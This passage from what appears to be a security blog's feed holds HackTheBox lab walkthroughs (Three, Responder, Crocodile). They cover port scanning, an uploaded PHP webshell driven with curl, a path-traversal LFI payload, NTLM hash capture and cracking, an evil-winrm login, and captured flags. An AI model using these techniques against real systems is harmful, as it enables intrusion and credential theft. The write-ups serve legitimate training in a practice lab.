class="hljs-number">10.129</span>.<span class="hljs-number">5.68</span>.....[*] Found writable share ADMIN<span class="hljs-variable">$</span>[*] Uploading file aWUNhKDQ.exe[*] Opening SVCManager on <span class="hljs-number">10.129</span>.<span class="hljs-number">5.68</span>.....[*] Creating service TuyN on <span class="hljs-number">10.129</span>.<span class="hljs-number">5.68</span>.....[*] Starting service TuyN.....[!] Press help <span class="hljs-keyword">for</span> extra shell commandsMicrosoft Windows [<span class="hljs-type">Version</span> <span class="hljs-number">10.0</span><span class="hljs-type">.17763.2061</span>](c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.C:\Windows\system32&gt; <span class="hljs-built_in">cd</span> / C:\&gt; <span class="hljs-built_in">cd</span> Users C:\Users&gt; <span class="hljs-built_in">cd</span> Administrator C:\Users\Administrator&gt; <span class="hljs-built_in">cd</span> Desktop C:\Users\Administrator\Desktop&gt; <span class="hljs-built_in">dir</span> Volume <span class="hljs-keyword">in</span> drive C has no label. Volume Serial Number is <span class="hljs-number">9565</span><span class="hljs-literal">-0B4F</span> Directory of C:\Users\Administrator\Desktop<span class="hljs-number">07</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">30</span> AM    &lt;<span class="hljs-built_in">DIR</span>&gt;          .<span class="hljs-number">07</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">30</span> AM    &lt;<span class="hljs-built_in">DIR</span>&gt;          ..<span class="hljs-number">02</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">07</span>:<span class="hljs-number">36</span> AM                <span class="hljs-number">32</span> root.txt               <span class="hljs-number">1</span> File(s)             <span class="hljs-number">32</span> bytes               <span class="hljs-number">2</span> <span class="hljs-built_in">Dir</span>(s)  <span class="hljs-number">10</span>,<span class="hljs-number">694</span>,<span class="hljs-number">463</span>,<span class="hljs-number">488</span> bytes freeC:\Users\Administrator\Desktop&gt; <span class="hljs-built_in">type</span> root.txtb91ccec3305e98240082d4474b848528</code></pre><p>Flag: <code>b91ccec3305e98240082d4474b848528</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Very Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Three</title>
      <link href="/2024/05/22/Three/"/>
      <url>/2024/05/22/Three/</url>
      
        <content type="html"><![CDATA[<p><img src="/../Three_img/49fa1274ca631fd870e9feca35b7d7c2.webp" alt="alt text"></p><h2 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h2><p>Machine IP: 10.129.227.248</p><h3 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning:"></a>NMAP Scanning:</h3><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>]└─<span class="hljs-variable">$</span> sudo nmap <span class="hljs-literal">-p-</span> <span class="hljs-literal">-sS</span> <span class="hljs-literal">--min-rate</span> <span class="hljs-number">5000</span> <span class="hljs-literal">--open</span> <span class="hljs-literal">-T5</span> <span class="hljs-literal">-vvv</span> <span class="hljs-literal">-Pn</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">227.248</span>[<span class="hljs-type">sudo</span>] password <span class="hljs-keyword">for</span> kali: Host discovery disabled (<span class="hljs-literal">-Pn</span>). All addresses will be marked <span class="hljs-string">&#x27;up&#x27;</span> and scan times may be slower.Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2024</span><span class="hljs-literal">-05-20</span> <span class="hljs-number">19</span>:<span class="hljs-number">12</span> EDTInitiating Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">19</span>:<span class="hljs-number">12</span>Completed Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">19</span>:<span class="hljs-number">12</span>, <span class="hljs-number">0.13</span>s elapsedDNS resolution of <span class="hljs-number">1</span> IPs took <span class="hljs-number">0.13</span>s. Mode: Async [<span class="hljs-comment">#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span><span class="hljs-type">Initiating</span> <span class="hljs-type">SYN</span> <span class="hljs-type">Stealth</span> <span class="hljs-type">Scan</span> <span class="hljs-type">at</span> <span class="hljs-number">19</span>:<span class="hljs-number">12</span><span class="hljs-type">Scanning</span> <span class="hljs-number">10.129</span><span class="hljs-type">.227.248</span> [<span class="hljs-number">65535</span> <span class="hljs-type">ports</span>]<span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">80</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.227.248</span><span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">22</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.227.248</span><span class="hljs-type">Completed</span> <span class="hljs-type">SYN</span> <span class="hljs-type">Stealth</span> <span class="hljs-type">Scan</span> <span class="hljs-type">at</span> <span class="hljs-number">19</span>:<span class="hljs-number">12</span>, <span class="hljs-number">17.75</span><span class="hljs-type">s</span> <span class="hljs-type">elapsed</span> (<span class="hljs-number">65535</span> <span class="hljs-type">total</span> <span class="hljs-type">ports</span>)<span class="hljs-type">Nmap</span> <span class="hljs-type">scan</span> <span class="hljs-type">report</span> <span class="hljs-type">for</span> <span class="hljs-number">10.129</span><span class="hljs-type">.227.248</span><span class="hljs-type">Host</span> <span class="hljs-type">is</span> <span class="hljs-type">up</span>, <span class="hljs-type">received</span> <span class="hljs-type">user</span>-<span class="hljs-type">set</span> (<span class="hljs-number">0.081</span><span class="hljs-type">s</span> <span class="hljs-type">latency</span>)<span class="hljs-type">.</span><span class="hljs-type">Scanned</span> <span class="hljs-type">at</span> <span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">20</span> <span class="hljs-number">19</span>:<span class="hljs-number">12</span>:<span class="hljs-number">18</span> <span class="hljs-type">EDT</span> <span class="hljs-type">for</span> <span class="hljs-number">18</span><span class="hljs-type">s</span><span class="hljs-type">Not</span> <span class="hljs-type">shown</span>: <span class="hljs-number">56509</span> <span class="hljs-type">closed</span> <span class="hljs-type">tcp</span> <span class="hljs-type">ports</span> (<span class="hljs-type">reset</span>), <span class="hljs-number">9024</span> <span class="hljs-type">filtered</span> <span class="hljs-type">tcp</span> <span class="hljs-type">ports</span> (<span class="hljs-type">no</span>-<span class="hljs-type">response</span>)<span class="hljs-type">Some</span> <span class="hljs-type">closed</span> <span class="hljs-type">ports</span> <span class="hljs-type">may</span> <span class="hljs-type">be</span> <span class="hljs-type">reported</span> <span class="hljs-type">as</span> <span class="hljs-type">filtered</span> <span class="hljs-type">due</span> <span class="hljs-type">to</span> --<span class="hljs-type">defeat</span>-<span class="hljs-type">rst</span>-<span class="hljs-type">ratelimit</span><span class="hljs-type">PORT</span>   <span class="hljs-type">STATE</span> <span class="hljs-type">SERVICE</span> <span class="hljs-type">REASON</span><span class="hljs-number">22</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">open</span>  <span class="hljs-type">ssh</span>     <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">63</span><span class="hljs-number">80</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">open</span>  <span class="hljs-type">http</span>    <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">63</span><span class="hljs-type">Read</span> <span class="hljs-type">data</span> <span class="hljs-type">files</span> <span class="hljs-type">from</span>: /<span class="hljs-type">usr</span>/<span class="hljs-type">bin</span>/<span class="hljs-type">..</span>/<span class="hljs-type">share</span>/<span class="hljs-type">nmap</span><span class="hljs-type">Nmap</span> <span class="hljs-type">done</span>: <span class="hljs-number">1</span> <span class="hljs-type">IP</span> <span class="hljs-type">address</span> (<span class="hljs-number">1</span> <span class="hljs-type">host</span> <span class="hljs-type">up</span>) <span class="hljs-type">scanned</span> <span class="hljs-type">in</span> <span class="hljs-number">17.99</span> <span class="hljs-type">seconds</span>           <span class="hljs-type">Raw</span> <span class="hljs-type">packets</span> <span class="hljs-type">sent</span>: <span class="hljs-number">87952</span> (<span class="hljs-number">3.870</span><span class="hljs-type">MB</span>) | <span class="hljs-type">Rcvd</span>: <span class="hljs-number">65148</span> (<span class="hljs-number">2.606</span><span class="hljs-type">MB</span>)</code></pre><h3 id="FULL-NMAP-Scanning"><a href="#FULL-NMAP-Scanning" class="headerlink" title="FULL NMAP Scanning:"></a>FULL NMAP Scanning:</h3><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>]└─<span class="hljs-variable">$</span> nmap <span class="hljs-literal">-A</span> <span class="hljs-literal">-sC</span> <span class="hljs-literal">-sV</span> <span class="hljs-literal">-p22</span>,<span class="hljs-number">80</span>  <span class="hljs-number">10.129</span>.<span class="hljs-number">227.248</span> <span class="hljs-literal">-Pn</span>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2024</span><span class="hljs-literal">-05-20</span> <span class="hljs-number">19</span>:<span class="hljs-number">12</span> EDTNmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">227.248</span>Host is up (<span class="hljs-number">0.14</span>s latency).PORT   STATE SERVICE VERSION<span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">7.6</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0.<span class="hljs-number">7</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)| ssh<span class="hljs-literal">-hostkey</span>: |   <span class="hljs-number">2048</span> <span class="hljs-number">17</span>:<span class="hljs-number">8</span>b:d4:<span class="hljs-number">25</span>:<span class="hljs-number">45</span>:<span class="hljs-number">2</span>a:<span class="hljs-number">20</span>:b8:<span class="hljs-number">79</span>:f8:e2:<span class="hljs-number">58</span>:d7:<span class="hljs-number">8</span>e:<span class="hljs-number">79</span>:f4 (RSA)|   <span class="hljs-number">256</span> e6:<span class="hljs-number">0</span>f:<span class="hljs-number">1</span>a:f6:<span class="hljs-number">32</span>:<span class="hljs-number">8</span>a:<span class="hljs-number">40</span>:ef:<span class="hljs-number">2</span>d:a7:<span class="hljs-number">3</span>b:<span class="hljs-number">22</span>:d1:c7:<span class="hljs-number">14</span>:fa (ECDSA)|_  <span class="hljs-number">256</span> <span class="hljs-number">2</span>d:e1:<span class="hljs-number">87</span>:<span class="hljs-number">41</span>:<span class="hljs-number">75</span>:f3:<span class="hljs-number">91</span>:<span class="hljs-number">54</span>:<span class="hljs-number">41</span>:<span class="hljs-number">16</span>:b7:<span class="hljs-number">2</span>b:<span class="hljs-number">80</span>:c6:<span class="hljs-number">8</span>f:<span class="hljs-number">05</span> (ED25519)<span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">29</span> ((Ubuntu))|_http<span class="hljs-literal">-title</span>: The Toppers|_http<span class="hljs-literal">-server-header</span>: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">29</span> (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">23.35</span> seconds</code></pre><p> How many TCP ports are open? </p><ul><li>2</li></ul><p> What is the domain of the email address provided in the “Contact” section of the website? </p><p><img src="/../Three_img/1.png" alt="alt text"></p><ul><li>thetoppers.htb</li></ul><p> In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames? </p><ul><li>&#x2F;etc&#x2F;hosts</li></ul><p> Which sub-domain is discovered during further enumeration? </p><h2 id="FUZZING"><a href="#FUZZING" class="headerlink" title="FUZZING"></a>FUZZING</h2><h3 id="WFUZZ"><a href="#WFUZZ" class="headerlink" title="WFUZZ"></a>WFUZZ</h3><ul><li>command used: <pre><code class="hljs bash">wfuzz -c -w /home/kali/Desktop/Workspace/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb -H <span class="hljs-string">&quot;Host: FUZZ.thetoppers.htb&quot;</span> --hl 1234</code></pre></li></ul><p><img src="/../Three_img/2.png" alt="alt text"></p><p>All the responses are 200 OK there is only one  404 so let’s see if this is the one :</p><p>Add it to <code>/etc/hosts</code></p><p><img src="/../Three_img/3.png" alt="alt text"></p><p><img src="/../Three_img/4.png" alt="alt text"></p><p>Answer: </p><ul><li>s3.thetoppers.htb</li></ul><p> Which service is running on the discovered sub-domain?</p><p><img src="/../Three_img/5.png" alt="alt text"></p><p><img src="/../Three_img/6.png" alt="alt text"></p><ul><li>Amazon s3</li></ul><p> Which command line utility can be used to interact with the service running on the discovered sub-domain? </p><p><img src="/../Three_img/7.png" alt="alt text"></p><ul><li>AWSCLI</li></ul><p> Which command is used to set up the AWS CLI installation? </p><p><img src="/../Three_img/8.png" alt="alt text"></p><ul><li>aws configure</li></ul><p> What is the command used by the above utility to list all of the S3 buckets? </p><ul><li>aws s3 ls</li></ul><p> This server is configured to run files written in what web scripting language? </p><pre><code class="hljs powershell">sudo apt install awscli</code></pre><p>Configure aws</p><p><img src="/../Three_img/9.png" alt="alt text"></p><p>Try to connect to the s3 bucket</p><p><img src="/../Three_img/10.png" alt="alt text"></p><p>Answer:</p><ul><li>php</li></ul><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>Submit root flag:</p><p>We’re gonna use this github manual to upload a simple webshell:</p><p><a href="https://gist.github.com/nicolasdao/edc30b5ad57f1e2147cf3b63bd76f6a9">AWS CLI manual. Keywords: aws cli aws-cli s3</a></p><p><img src="/../Three_img/11.png" alt="alt text"></p><p>Upload a WebShell:</p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>]└─<span class="hljs-variable">$</span> aws s3 <span class="hljs-built_in">cp</span> shell.php <span class="hljs-literal">--endpoint-url</span>=http://s3.thetoppers.htb s3://thetoppers.htb</code></pre><p>Check if the file has been uploaded:</p><p><img src="/../Three_img/12.png" alt="alt text"></p><p>Now we use curl to get the flag:</p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]└─<span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-string">&quot;http://thetoppers.htb/shell.php?cmd=whoami&quot;</span><span class="hljs-comment"># Take input from the url paramter. shell.php?cmd=whoami</span>www<span class="hljs-literal">-data</span>┌──(kali㉿kali)-[~]└─<span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-string">&quot;http://thetoppers.htb/shell.php?cmd=ls+../&quot;</span><span class="hljs-comment"># Take input from the url paramter. shell.php?cmd=whoami</span>flag.txthtml┌──(kali㉿kali)-[~]└─<span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-string">&quot;http://thetoppers.htb/shell.php?cmd=cat+../flag.txt&quot;</span><span class="hljs-comment"># Take input from the url paramter. shell.php?cmd=whoami</span>a980d99281a28d638ac68b9bf9453c2b</code></pre><p>FLAG : <code>a980d99281a28d638ac68b9bf9453c2b</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Very Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Responder</title>
      <link href="/2024/05/22/Responder/"/>
      <url>/2024/05/22/Responder/</url>
      
        <content type="html"><![CDATA[<p><img src="/../RESPONDER_IMG/responder.png" alt="alt text"></p><h2 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h2><p>Machine IP: 10.129.158.118</p><h3 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning:"></a>NMAP Scanning:</h3><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads]└─$ sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.129.158.118[sudo] password <span class="hljs-keyword">for</span> kali: Host discovery disabled (-Pn). All addresses will be marked <span class="hljs-string">&#x27;up&#x27;</span> and scan <span class="hljs-built_in">times</span> may be slower.Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-17 14:28 EDTInitiating Parallel DNS resolution of 1 host. at 14:28Completed Parallel DNS resolution of 1 host. at 14:28, 0.16s elapsedDNS resolution of 1 IPs took 0.16s. Mode: Async [<span class="hljs-comment">#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span>Initiating SYN Stealth Scan at 14:28Scanning 10.129.158.118 [65535 ports]Discovered open port 80/tcp on 10.129.158.118Discovered open port 5985/tcp on 10.129.158.118Discovered open port 7680/tcp on 10.129.158.118Completed SYN Stealth Scan at 14:29, 26.40s elapsed (65535 total ports)Nmap scan report <span class="hljs-keyword">for</span> 10.129.158.118Host is up, received user-set (0.063s latency).Scanned at 2024-05-17 14:28:43 EDT <span class="hljs-keyword">for</span> 26sNot shown: 65532 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT     STATE SERVICE   REASON80/tcp   open  http      syn-ack ttl 1275985/tcp open  wsman     syn-ack ttl 1277680/tcp open  pando-pub syn-ack ttl 127Read data files from: /usr/bin/../share/nmapNmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 26.67 seconds           Raw packets sent: 131085 (5.768MB) | Rcvd: 20 (872B)</code></pre><h3 id="FULL-NMAP-Scanning"><a href="#FULL-NMAP-Scanning" class="headerlink" title="FULL NMAP Scanning:"></a>FULL NMAP Scanning:</h3><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>]└─<span class="hljs-variable">$</span> nmap <span class="hljs-literal">-A</span> <span class="hljs-literal">-sC</span> <span class="hljs-literal">-sV</span> <span class="hljs-literal">-p80</span>,<span class="hljs-number">5985</span>,<span class="hljs-number">7680</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">95.234</span> <span class="hljs-literal">-Pn</span>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2024</span><span class="hljs-literal">-05-20</span> <span class="hljs-number">18</span>:<span class="hljs-number">21</span> EDTNmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">95.234</span>Host is up (<span class="hljs-number">0.067</span>s latency).PORT     STATE SERVICE    VERSION<span class="hljs-number">80</span>/tcp   open  http       Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">52</span> ((Win64) OpenSSL/<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span>m PHP/<span class="hljs-number">8.1</span>.<span class="hljs-number">1</span>)|_http<span class="hljs-literal">-title</span>: Site doesn<span class="hljs-string">&#x27;t have a title (text/html; charset=UTF-8).</span><span class="hljs-string">|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1</span><span class="hljs-string">5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><span class="hljs-string">|_http-title: Not Found</span><span class="hljs-string">|_http-server-header: Microsoft-HTTPAPI/2.0</span><span class="hljs-string">7680/tcp open  pando-pub?</span><span class="hljs-string">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><span class="hljs-string"></span><span class="hljs-string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 21.44 seconds</span></code></pre><p>When visiting the web service using the IP address, what is the domain that we are being redirected to? </p><ul><li><p>unika.htb</p><p>  <img src="/../RESPONDER_IMG/1.png" alt="alt text"></p></li></ul><p> Add to &#x2F;etc&#x2F;hosts the IP with the domain name <code>unika.htb</code> </p><p><img src="/../RESPONDER_IMG/2.png" alt="alt text"></p><p>Which scripting language is being used on the server to generate webpages? </p><ul><li>php</li></ul><p>Using Wappalyzer we see that we have php:</p><p><img src="/../RESPONDER_IMG/3.png" alt="alt text"></p><p>Also on the site if we click on <code>UNIKA</code> we find information disclosure:</p><p><img src="/../RESPONDER_IMG/4.png" alt="alt text"></p><p>And we can find out that the scripting language is php</p><p><img src="/../RESPONDER_IMG/5.png" alt="alt text"></p><p>What is the name of the URL parameter which is used to load different language versions of the webpage? </p><p><img src="/../RESPONDER_IMG/6.png" alt="alt text"></p><p><img src="/../RESPONDER_IMG/7.png" alt="alt text"></p><ul><li>page</li></ul><p> Which of the following values for the <code>page</code> parameter would be an example of exploiting a Local File Include (LFI) vulnerability: “french.html”, “<a href="notion://10.10.14.6/somefile">&#x2F;&#x2F;10.10.14.6&#x2F;somefile</a>“, “..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts”, “minikatz.exe” </p><pre><code class="hljs powershell">http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts</code></pre><p><img src="/../RESPONDER_IMG/8.png" alt="alt text"></p><ul><li>..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts</li></ul><p>Which of the following values for the <code>page</code> parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: “french.html”, “<a href="notion://10.10.14.6/somefile">&#x2F;&#x2F;10.10.14.6&#x2F;somefile</a>“, “..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts”, “minikatz.exe” </p><ul><li><a href="notion://10.10.14.6/somefile">&#x2F;&#x2F;10.10.14.6&#x2F;somefile</a></li></ul><p> What does NTLM stand for? </p><ul><li>New Technology LAN Manager</li></ul><p> Which flag do we use in the Responder utility to specify the network interface? </p><ul><li>-I</li></ul><p> There are several tools that take a NetNTLMv2 challenge&#x2F;response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as <code>john</code>, but the full name is what?. </p><ul><li>John The Ripper</li></ul><p>What is the password for the administrator user?</p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>]└─<span class="hljs-variable">$</span> sudo responder <span class="hljs-literal">-I</span> tun0</code></pre><p>Replace with our tun0 IP</p><p><img src="/../RESPONDER_IMG/9.png" alt="alt text"></p><p><img src="/../RESPONDER_IMG/Screenshot%202024-05-22%20at%2003.22.02.png" alt="alt text"></p><pre><code class="hljs powershell">Administrator::RESPONDER:<span class="hljs-number">9</span>eca27232a041cdd:<span class="hljs-number">41</span>DC346190A23C8CF70B7DE2BF0BE1DE:<span class="hljs-number">0101000000000000807</span>DE42DE6AADA015C38BD87C3D3B8E20000000002000800540034005100480001001E00570049004E002D004E004A005000370031005200590033004D004200310004003400570049004E002D004E004A005000370031005200590033004D00420031002E0054003400510048002E004C004F00430041004C000300140054003400510048002E004C004F00430041004C000500140054003400510048002E004C004F00430041004C0007000800807DE42DE6AADA0106000400020000000800300030000000000000000100000000200000E957A5114AEF28CB30974C534E703AD1C8D2B5D6C6DC9566F345BFB04277EC7F0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200310031000000000000000000</code></pre><p>Add the hash to a file </p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>]└─<span class="hljs-variable">$</span> nano hash.txt</code></pre><p>Found the password:</p><pre><code class="hljs bash">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code></pre><p><img src="/../RESPONDER_IMG/Screenshot%202024-05-22%20at%2003.22.10.png" alt="alt text"></p><ul><li>Password : <code>badminton</code></li></ul><p> We’ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on? </p><ul><li>5985</li></ul><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>Submit root flag</p><p>We’ll use <code>evil-winrm</code></p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>]└─<span class="hljs-variable">$</span> evil<span class="hljs-literal">-winrm</span> <span class="hljs-literal">-u</span> administrator <span class="hljs-literal">-p</span> badminton <span class="hljs-literal">-i</span> unika.htb</code></pre><p><img src="/../RESPONDER_IMG/12.png" alt="alt text"></p><p>Flag <code>ea81b7afddd03efaa0945333ed147fac</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Very Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crocodile</title>
      <link href="/2024/05/16/Crocodile/"/>
      <url>/2024/05/16/Crocodile/</url>
      
        <content type="html"><![CDATA[<p><img src="/../Crocodile_img/00935a242722b9a2c700bdb6b65195f6.webp" alt="alt text"></p><h3 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning :"></a>NMAP Scanning :</h3><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>]└─<span class="hljs-variable">$</span> sudo nmap <span class="hljs-literal">-p-</span> <span class="hljs-literal">-sS</span> <span class="hljs-literal">--min-rate</span> <span class="hljs-number">5000</span> <span class="hljs-literal">--open</span> <span class="hljs-literal">-T5</span> <span class="hljs-literal">-vvv</span> <span class="hljs-literal">-Pn</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">1.15</span></code></pre><p><img src="/../Crocodile_img/Screenshot%202024-05-16%20at%2021.52.35.png" alt="alt text"></p><p> What Nmap scanning switch employs the use of default scripts during a scan? </p><ul><li>-sC</li></ul><h3 id="NMAP-Full-Scanning"><a href="#NMAP-Full-Scanning" class="headerlink" title="NMAP Full Scanning :"></a>NMAP Full Scanning :</h3><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>]└─<span class="hljs-variable">$</span> nmap <span class="hljs-literal">-A</span> <span class="hljs-literal">-sC</span> <span class="hljs-literal">-sV</span> <span class="hljs-literal">-p21</span>,<span class="hljs-number">80</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">1.15</span> <span class="hljs-literal">-Pn</span></code></pre><p><img src="/../Crocodile_img/Screenshot%202024-05-16%20at%2021.52.53.png" alt="alt text"></p><p>What service version is found to be running on port 21? </p><ul><li>vsftpd 3.0.3</li></ul><p>Log in with ftp anonymous:</p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>]└─<span class="hljs-variable">$</span> ftp <span class="hljs-number">10.129</span>.<span class="hljs-number">1.15</span></code></pre><p><img src="/../Crocodile_img/Screenshot%202024-05-16%20at%2021.53.15.png" alt="alt text"></p><p>What FTP code is returned to us for the “Anonymous FTP login allowed” message? </p><ul><li>230</li></ul><p>After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?</p><ul><li>anonymous</li></ul><p>After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server? </p><ul><li>get</li></ul><p>What is one of the higher-privilege sounding usernames in ‘allowed.userlist’ that we download from the FTP server? </p><ul><li>admin</li></ul><p><img src="/../Crocodile_img/Screenshot%202024-05-16%20at%2021.53.39.png" alt="alt text"></p><p><img src="/../Crocodile_img/6.png" alt="alt text"></p><p> What version of Apache HTTP Server is running on the target host? </p><ul><li>Apache httpd 2.4.41</li></ul><p>What switch can we use with Gobuster to specify we are looking for specific filetypes? </p><ul><li>-x</li></ul><p>Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service? </p><ul><li>login.php</li></ul><p><img src="/../dancing_images/Screenshot%202024-05-03%20at%2022.30.15.png" alt="alt text"></p><p>Log in with the credentials we have and get the Flag:</p><p><img src="/../Crocodile_img/Screenshot%202024-05-16%20at%2021.54.18.png" alt="alt text"></p><p><img src="/../Crocodile_img/Screenshot%202024-05-16%20at%2021.54.34.png" alt="alt text"></p><p>Flag : <code>c7110277ac44d78b6a9fff2232434d16</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Very Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sequel</title>
      <link href="/2024/05/16/Sequel/"/>
      <url>/2024/05/16/Sequel/</url>
      
